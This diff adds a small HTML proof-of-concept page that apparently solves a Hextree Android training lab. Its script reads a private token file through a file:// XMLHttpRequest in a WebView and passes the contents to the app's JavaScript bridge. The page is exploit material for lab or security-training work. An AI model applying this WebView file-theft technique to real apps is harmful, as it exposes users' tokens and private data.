@@ -1,0 +1,32 @@
+!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button onclick="getToken()">leakFileXHR</button>
+    <script>    
+
+    function getToken() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', "file:///data/data/io.hextree.attacksurface/files/token.txt", true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.responseText) {
+                    const response = xhr.responseText;
+                    console.log(response);
+                    // 调用 authCallback 并传递文件内容
+                    hextree.authCallback(response);
+                }
+            };
+            xhr.onerror = function(error) {
+                // console.log(error);
+            }
+            xhr.send();
+    }
+    </script>
+
+    
+</body>
+</html> 
